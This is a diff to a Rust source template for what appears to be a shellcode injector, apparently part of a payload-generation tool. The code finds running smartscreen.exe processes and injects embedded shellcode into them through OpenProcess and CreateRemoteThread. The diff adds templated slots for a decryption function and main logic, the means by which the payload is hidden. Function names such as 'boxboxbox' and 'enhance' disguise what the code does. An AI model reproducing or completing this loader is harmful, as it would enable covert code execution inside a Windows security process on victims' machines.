@@ -7,6 +7,9 @@ use windows::Win32::System::Threading::CreateRemoteThread;
 use windows::Win32::System::Threading::OpenProcess;
 use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
 use std::include_bytes;
+{{IMPORTS}}
+
+{{DECRYPTION_FUNCTION}}
 
 fn boxboxbox(tar: &str) -> Vec<u32> {
     // search for processes to inject into
@@ -19,7 +22,7 @@ fn boxboxbox(tar: &str) -> Vec<u32> {
     return dom;
 }
 
-fn enhance(buf: &[u8], tar: &u32) {
+fn enhance(buf: &Vec<u8>, tar: &u32) {
     // injecting in target processes :)
 
     unsafe {
@@ -59,12 +62,17 @@ fn main() {
     let tar: &str = "smartscreen.exe";
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
+    let mut vec: Vec<u8> = Vec::new();
+    for i in buf.iter() {
+        vec.push(*i);
+    }
     let list: Vec<u32> = boxboxbox(tar);
     if list.len() == 0 {
         panic!("[-] Unable to find a process.")
     } else {
         for i in &list {
-            enhance(buf, i);
+            {{MAIN}}
+            enhance(&vec, i);
         }
     }
 }
